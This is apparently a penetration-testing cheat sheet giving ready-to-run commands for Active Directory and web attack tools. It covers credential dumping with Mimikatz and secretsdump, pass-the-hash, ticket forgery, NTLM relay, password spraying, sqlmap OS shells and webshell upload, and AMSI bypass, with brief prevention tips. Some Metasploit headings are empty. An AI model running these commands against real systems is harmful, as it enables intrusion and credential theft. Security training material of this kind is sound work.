## Impacket — Python AD/Network Attack Toolkit

### Core Tools
- psexec.py: Remote command execution via SMB service creation
- smbexec.py: Stealthier SMB execution (no binary upload)
- wmiexec.py: WMI-based remote execution
- dcomexec.py: DCOM-based execution (stealthiest)
- atexec.py: Task Scheduler-based execution
- secretsdump.py: Extract credentials (SAM, LSA, NTDS.dit, DCSync)
- GetNPUsers.py: AS-REP Roasting (no pre-auth users)
- GetUserSPNs.py: Kerberoasting (TGS requests)
- getTGT.py: Get TGT from password/hash/key
- getST.py: Get service ticket (constrained delegation)
- ticketer.py: Create Golden/Silver tickets
- ntlmrelayx.py: NTLM relay attacks
- smbclient.py: SMB client for file operations
- mssqlclient.py: MSSQL client with xp_cmdshell support
- addcomputer.py: Add machine account to domain
- rbcd.py: Resource-Based Constrained Delegation setup

### Usage Patterns
# DCSync
secretsdump.py domain/admin:pass@DC_IP
# Pass-the-Hash
psexec.py -hashes :NTLM domain/admin@TARGET
# Kerberos auth
export KRB5CCNAME=admin.ccache
psexec.py -k -no-pass domain/admin@TARGET

## BloodHound — Active Directory Attack Path Mapping

### Overview
BloodHound uses graph theory to reveal hidden relationships and attack paths in AD environments. Collects data about users, groups, computers, ACLs, sessions, and trusts.

### Data Collection
- SharpHound (C#): SharpHound.exe -c all --zipfilename output.zip
- bloodhound-python: bloodhound-python -d domain.local -u user -p pass -ns DC_IP -c all
- ADExplorer snapshot: import into BloodHound

### Key Queries
- Shortest path to Domain Admin from owned users
- Find all Kerberoastable users
- Find all AS-REP roastable users
- Find computers with unconstrained delegation
- Find users with DCSync rights
- Find paths through GPO abuse
- Find paths through ADCS templates

### Custom Cypher Queries
- Users with path to DA: MATCH p=shortestPath((u:User)-[*1..]->(g:Group{name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
- Kerberoastable with path to DA
- Computers where domain users are local admin

### BloodHound CE (Community Edition)
- Modern web interface with REST API
- Docker deployment
- New collection methods and attack path analysis

## Mimikatz — Windows Credential Extraction

### Core Commands
privilege::debug — enable debug privilege (required)
sekurlsa::logonpasswords — dump all logon credentials from memory
sekurlsa::wdigest — WDigest plaintext passwords
sekurlsa::kerberos — Kerberos tickets
sekurlsa::tickets /export — export all Kerberos tickets
lsadump::sam — dump SAM database (local accounts)
lsadump::dcsync /user:Administrator — DCSync attack
lsadump::dcsync /all — dump all domain hashes

### Kerberos Attacks
kerberos::golden — create Golden Ticket
kerberos::silver — create Silver Ticket
kerberos::ptt ticket.kirbi — pass-the-ticket

### Credential Manipulation
token::elevate — elevate to SYSTEM token
vault::cred — Windows Vault credentials
dpapi::chrome — Chrome saved passwords

### Alternatives
- pypykatz: Python implementation (runs on Linux)
- Rubeus: C# Kerberos abuse toolkit
- SharpDPAPI: DPAPI credential extraction
- nanodump/MiniDumpWriteDump: dump LSASS memory
- comsvcs.dll: rundll32 comsvcs.dll MiniDump PID file full

### LSASS Dump Methods
- procdump.exe -accepteula -ma lsass.exe lsass.dmp
- Task Manager > Details > lsass.exe > Create dump file
- comsvcs.dll method (LOLBin)
- nanodump (direct syscalls, evasion)

## Burp Suite — Web Application Testing

### Core Features
- Proxy: intercept/modify HTTP(S) traffic
- Repeater: manually modify and resend requests
- Intruder: automated payload delivery (brute force, fuzzing)
- Scanner: automated vulnerability scanning (Pro)
- Decoder: encode/decode data
- Comparer: diff two responses
- Sequencer: analyze token randomness

### Essential Extensions
- Autorize: automated authorization testing (IDOR/BOLA)
- JWT Editor: manipulate JSON Web Tokens
- Active Scan++: enhanced scanning
- Param Miner: hidden parameter discovery
- Turbo Intruder: high-speed request sending (race conditions)
- Logger++: enhanced request logging
- InQL: GraphQL testing
- SAML Raider: SAML authentication testing
- Retire.js: detect vulnerable JavaScript libraries
- Hackvertor: encoding/decoding Swiss Army knife

### Intruder Attack Types
- Sniper: single payload position, one at a time
- Battering Ram: same payload in all positions
- Pitchfork: different payloads per position (paired)
- Cluster Bomb: all combinations of payloads

### Common Workflows
1. Proxy traffic while browsing application
2. Send interesting requests to Repeater
3. Modify parameters to test for injections
4. Use Intruder for brute force / fuzzing
5. Check Scanner results for automated findings

## Nmap — Advanced Scanning Techniques

### Scan Types
-sS: SYN scan (stealth, default with root)
-sT: TCP connect scan (no root needed)
-sU: UDP scan (slow but important)
-sV: Version detection
-sC: Default scripts
-O: OS detection
-A: Aggressive (sV + sC + O + traceroute)

### Speed and Evasion
-T0 to -T5: timing (0=paranoid, 5=insane)
--min-rate 1000: minimum packet rate
-f: fragment packets
--mtu 24: custom MTU fragmentation
-D RND:10: decoy scan with 10 random IPs
--source-port 53: spoof source port (DNS)
--data-length 50: append random data
-sI zombie: idle scan via zombie host

### Script Engine (NSE)
--script vuln: run all vuln detection scripts
--script smb-vuln*: SMB vulnerabilities
--script http-enum: web directory enumeration
--script dns-brute: DNS subdomain brute force
--script ftp-anon: anonymous FTP check
--script ssl-heartbleed: Heartbleed detection
--script broadcast-dhcp-discover: DHCP discovery
--script auth: authentication-related scripts

### Output
-oN: normal output
-oX: XML output (for tools)
-oG: grepable output
-oA: all formats

### Common Pentesting Scans
Quick overview: nmap -sC -sV -oA initial TARGET
Full TCP: nmap -p- -sV -oA full TARGET
UDP top 20: nmap -sU --top-ports 20 -sV TARGET
Vuln scan: nmap -sC -sV --script vuln TARGET

## C2 Framework Concepts (Red Team Operations)

### C2 Architecture
- Team Server: central server managing operations
- Listeners: receive connections from implants
- Beacons/Agents: implants on compromised hosts
- Malleable Profiles: customize network traffic signatures

### Common C2 Frameworks
- Cobalt Strike: commercial, industry standard
- Sliver: open source, Go-based, cross-platform
- Havoc: modern open source C2
- Mythic: modular, web-based interface
- Metasploit: open source, extensive exploit library
- Empire (Starkiller): PowerShell/Python agents
- Covenant: .NET-based C2

### Beacon Communication
- HTTP/HTTPS: most common, blends with web traffic
- DNS: stealthy, low bandwidth, hard to detect
- SMB: lateral movement within networks (named pipes)
- TCP: direct connection
- DOH (DNS over HTTPS): encrypted DNS tunneling

### Key Operations
- Initial access: phishing, exploit delivery
- Persistence: registry, scheduled tasks, services
- Privilege escalation: token manipulation, exploits
- Lateral movement: PSExec, WMI, WinRM, DCOM
- Credential harvesting: Mimikatz, Kerberos attacks
- Data collection: keylogging, screenshots, file access
- Exfiltration: encrypted channels, DNS, cloud storage

### OPSEC Considerations
- Use HTTPS with valid certificates
- Domain fronting or redirectors
- Sleep/jitter to avoid pattern detection
- Process injection to avoid on-disk detection
- AMSI bypass for PowerShell
- ETW patching to avoid logging

## SQLmap — Automated SQL Injection

### Basic Usage
sqlmap -u 'http://target/page?id=1' --batch --dbs
sqlmap -u 'http://target/page?id=1' -D dbname --tables
sqlmap -u 'http://target/page?id=1' -D dbname -T users --dump

### Advanced Options
--forms: automatically test forms on page
--crawl=3: spider site to depth 3
-r request.txt: use saved Burp request
--cookie='session=abc': include cookies
--level=5 --risk=3: maximum testing thoroughness
--os-shell: attempt OS shell
--os-pwn: attempt Meterpreter/VNC
--file-read=/etc/passwd: read server files
--file-write=shell.php --file-dest=/var/www/html/: upload files

### Tamper Scripts (WAF Bypass)
--tamper=space2comment: replace spaces with /**/ 
--tamper=between: replace > with NOT BETWEEN 0 AND
--tamper=randomcase: random uppercase/lowercase
--tamper=charencode: URL encode characters
--tamper=base64encode: base64 encode payload

### Specific DBMS
--dbms=mysql: target MySQL specifically
--dbms=mssql: target MSSQL
--technique=BT: only boolean and time-based

### Tips
- Start with --batch --dbs for quick enumeration
- Use -r with Burp request for complex requests
- --level=5 --risk=3 for thorough testing
- --threads=10 for faster extraction
- Save progress: --output-dir=./sqlmap_output

## Metasploit Framework — Key Modules

### Exploitation Workflow

search type:exploit name:keyword
use exploit/module/path
show options
set RHOSTS target
set LHOST attacker
set PAYLOAD payload/type

### Essential Modules

exploit/windows/smb/ms17_010_eternalblue: EternalBlue

### Meterpreter Commands
sysinfo, getuid, getsystem
hashdump, load kiwi (mimikatz)
upload/download, shell
portfwd add -l 8080 -p 80 -r internal_target
run autoroute -s 10.10.0.0/24
load incognito, list_tokens, impersonate_token

### Auxiliary Modules

## CrackMapExec (NetExec) — Network Attack Swiss Army Knife

### SMB Operations
cme smb TARGET -u user -p pass: check credentials
cme smb TARGET -u user -H NTLM: pass-the-hash
cme smb TARGET -u user -p pass --shares: list shares
cme smb TARGET -u user -p pass --sessions: active sessions
cme smb TARGET -u user -p pass --users: enumerate users
cme smb TARGET -u user -p pass --groups: enumerate groups
cme smb TARGET -u user -p pass -x 'command': execute command
cme smb TARGET -u user -p pass --sam: dump SAM
cme smb TARGET -u user -p pass --lsa: dump LSA secrets
cme smb TARGET -u user -p pass --ntds: DCSync

### Password Spraying
cme smb TARGET -u users.txt -p 'Password123!': spray one password
cme smb TARGET -u users.txt -p passwords.txt --no-bruteforce: paired
cme smb TARGET -u users.txt -p users.txt --no-bruteforce: user=pass

### WinRM
cme winrm TARGET -u user -p pass: check WinRM access
cme winrm TARGET -u user -p pass -x 'command': execute

### LDAP
cme ldap DC_IP -u user -p pass --users: domain users
cme ldap DC_IP -u user -p pass --groups: domain groups
cme ldap DC_IP -u user -p pass --kerberoasting: get TGS hashes
cme ldap DC_IP -u user -p pass --asreproast: AS-REP roasting

### MSSQL
cme mssql TARGET -u sa -p pass --local-auth -x 'command'
cme mssql TARGET -u user -p pass -q 'SELECT name FROM sys.databases'

## Web Fuzzing Tools — ffuf and gobuster

### ffuf (Fuzz Faster U Fool)
Directory: ffuf -u http://target/FUZZ -w wordlist.txt
Extensions: ffuf -u http://target/FUZZ -w wordlist.txt -e .php,.html,.txt,.bak
Subdomains: ffuf -u http://FUZZ.target.com -w subs.txt -H 'Host: FUZZ.target.com'
Parameters: ffuf -u http://target/page?FUZZ=test -w params.txt
POST data: ffuf -u http://target/login -X POST -d 'user=admin&pass=FUZZ' -w passwords.txt
Filtering: -fc 404 (status), -fs 1234 (size), -fw 50 (words), -fl 10 (lines)
Speed: -t 100 (threads), -rate 500 (requests/sec)
Recursion: -recursion -recursion-depth 2

### gobuster
Directory: gobuster dir -u http://target -w wordlist.txt -x php,html -t 50
Subdomain: gobuster dns -d target.com -w subs.txt -t 50
Vhost: gobuster vhost -u http://target -w subs.txt
S3 buckets: gobuster s3 -w bucket-names.txt

### Recommended Wordlists (SecLists)
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

## Certipy / Certify — ADCS Attack Tools

### Certipy (Python — preferred for Linux)
Find vulnerable templates: certipy find -u user@domain -p pass -dc-ip DC_IP -vulnerable
Request cert: certipy req -u user@domain -p pass -target CA -template VulnTemplate -upn admin@domain
Authenticate: certipy auth -pfx admin.pfx -dc-ip DC_IP
Shadow credentials: certipy shadow auto -u user@domain -p pass -account target
Backup CA keys: certipy ca -backup -u admin@domain -p pass -ca CA-NAME
Forge cert: certipy forge -ca-pfx ca.pfx -upn admin@domain -subject 'CN=Administrator'

### Certify (C# — for Windows)
Find: Certify.exe find /vulnerable
Request: Certify.exe request /ca:CA-NAME /template:VulnTemplate /altname:admin

### Attack Chains
ESC1: find vulnerable → request with SAN → auth as admin
ESC4: modify template ACLs → enable SAN → ESC1
ESC8: PetitPotam → relay to ADCS HTTP → get DC cert → DCSync
Shadow Creds: certipy shadow → get NT hash → pass-the-hash

## Evil-WinRM — Windows Remote Management Shell

### Basic Usage
evil-winrm -i TARGET -u user -p password
evil-winrm -i TARGET -u user -H NTLM_HASH (pass-the-hash)
evil-winrm -i TARGET -u user -k (Kerberos)
evil-winrm -i TARGET -u user -p pass -s /scripts/ -e /exe/ (load scripts/binaries)

### Built-in Commands
upload local_file remote_path: upload file
download remote_path local_path: download file
menu: show loaded functions
Bypass-4MSI: AMSI bypass
Dll-Loader: load DLL in memory
Donut-Loader: execute .NET assembly in memory
Invoke-Binary: run exe from memory

### Common Workflow
1. Connect: evil-winrm -i TARGET -u user -p pass
2. Upload tools: upload winPEAS.exe C:\temp\winPEAS.exe
3. Enumerate: C:\temp\winPEAS.exe
4. Privilege escalation based on findings
5. Download loot: download C:\Users\admin\flag.txt

### Requirements
Target must have WinRM enabled (port 5985/5986)
User must be in Remote Management Users or Administrators group

## Responder — LLMNR/NBT-NS/mDNS Poisoner

### Overview
Poisons LLMNR, NBT-NS, and mDNS requests on the network. When a Windows machine fails DNS resolution, it falls back to these protocols — Responder answers with attacker IP to capture NTLM hashes.

### Usage
Capture mode: responder -I eth0 -wrf
Analyze only: responder -I eth0 -A (passive)
Disable specific: responder -I eth0 -wrf --disable-ess (disable ESS for relay)

### What It Captures
- NTLMv2 hashes: crackable with hashcat -m 5600
- NTLMv1 hashes: crackable with hashcat -m 5500 or rainbow tables
- HTTP Basic auth: plaintext credentials
- WPAD proxy credentials

### NTLM Relay (with ntlmrelayx)
Disable SMB/HTTP in Responder (we relay, not capture)
responder -I eth0 --disable-ess -r -d -w
ntlmrelayx.py -tf targets.txt -smb2support -c 'command'
ntlmrelayx.py -tf targets.txt --delegate-access (RBCD)
ntlmrelayx.py -t ldap://DC_IP --escalate-user user (add DCSync rights)

### Prevention
Disable LLMNR: GPO > Computer > Admin Templates > DNS Client > Turn off multicast name resolution
Disable NBT-NS: Network adapter > TCP/IPv4 > Advanced > WINS > Disable NetBIOS
Enable SMB signing: GPO > Computer > Policies > Security Settings > Security Options
